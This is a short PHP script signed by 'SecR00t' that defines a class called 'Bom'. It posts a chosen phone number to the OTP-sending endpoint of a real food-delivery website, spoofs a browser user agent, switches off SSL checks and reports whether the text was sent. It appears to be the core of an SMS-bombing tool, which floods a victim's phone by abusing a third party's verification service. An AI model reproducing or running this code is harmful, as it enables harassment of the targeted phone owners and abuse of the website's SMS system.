<?php
// Modified by SecR00t
error_reporting(0);

Class Bom {

	public $no;

	public function sendC($url, $page, $params) {

        $ch = curl_init(); 
        curl_setopt ($ch, CURLOPT_URL, $url.$page); 
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 

        if(!empty($params)) {
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt ($ch, CURLOPT_POST, 1); 
        }

        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);

        $headers  = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
        $headers[] = 'X-Requested-With: XMLHttpRequest';

        curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
        //curl_setopt ($ch, CURLOPT_HEADER, 1);
        $result = curl_exec ($ch);
        curl_close($ch);
        return $result;

    }

    private function getStr($start, $end, $string) {
        if (!empty($string)) {
        $setring = explode($start,$string);
        $setring = explode($end,$setring[1]);
        return $setring[0];
        }
    }


    public function Verif()
    {
        $url = "https://www.phd.co.id/en/users/sendOTP";
        $no = $this->no;
        $data = "phone_number={$no}";
        $send = $this->sendC($url, null, $data);
        if (preg_match('/We have sent an OTP to your phone, Please enter the 4 digit code./', $send)) {
                print('Succses!');
            } else {
                print('Failed!');
            }
    }

    
}



